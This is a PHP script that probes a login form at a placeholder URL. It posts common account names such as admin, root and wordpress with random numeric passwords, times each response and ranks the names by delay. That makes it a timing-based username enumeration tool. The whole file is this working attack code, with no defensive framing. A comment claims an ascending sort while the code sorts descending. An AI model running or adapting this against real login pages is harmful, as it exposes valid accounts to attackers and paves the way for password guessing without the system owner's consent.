<?php

$POST_URL = "http://mywebserver/phps/login.php";

$USERNAMES = array(
	'init-connection',
	"admin",
	"administrator",
	"adm",
	"manager",
	"user",
	"root",
	"test",
	"guest",
	"wordpress",
	"digital",
	"moath",
	"webmaster",
	"top",
	"romani",
	"oskar",
	"optima"
	);

$RESULT = array();


function generate_random_password($length = 8) {
    $characters = '0123456789';
    $charactersLength = strlen($characters);
    $randomString = '';

    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;

}



function send_request($params)
{
    global $POST_URL;

    $ch = curl_init($POST_URL);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);
    return $info['total_time'];
}


function build_request_params($username, $password)
{
    $fields = array(
    'username' =>  $username,
    'password' =>  $password,
	);
    return $fields;
}

function save_response_info($username, $password_used, $response_time)
{
	global $RESULT;
	
	if($username == 'init-connection') return;

	$row = array(
	'Username' => $username,
	'Password Used' => $password_used,
	'Response Time' => $response_time
	);

	array_push($RESULT, $row);
}


foreach($USERNAMES as $username) {
		$password = generate_random_password(10);
		$params = build_request_params($username, $password);
		$response_time = send_request($params);
		save_response_info($username, $password, $response_time);
	}



function draw_results()
{
	global $RESULT;
	global $POST_URL;

	echo '<center>';
	echo '<h2>' . $POST_URL . '</h2>';
	echo '
	<table border="1" cellspacing="2" cellpadding="2">
	<tr>
	<td align="center", style="font-weight: bold;">
	<font face="Arial, Helvetica, sans-serif">Username</font>
	</td>
	<td align="center", style="font-weight: bold;">
	<font face="Arial, Helvetica, sans-serif">Response Time</font>
	</td>';

	foreach ($RESULT as $row) 
	{
		echo '<tr>';
		echo '<td align="center">';
		echo '<font face="Arial, Helvetica, sans-serif">'. $row['Username'] .'</font>';
		echo '</td>';
		echo '<td align="center">';
		echo '<font face="Arial, Helvetica, sans-serif">'. $row['Response Time'] .'</font>';
		echo '</td>';
	}
	echo '</table>';
	echo '</center>';

}

function sort_result()
{
	global $RESULT;
	$response_time = array();
	foreach ($RESULT as $key => $row)
	{
	    $response_time[$key] = $row['Response Time'];
	}
	array_multisort($response_time, SORT_DESC, $RESULT);

}

# sort ascending order
sort_result();

# print results
draw_results();

?>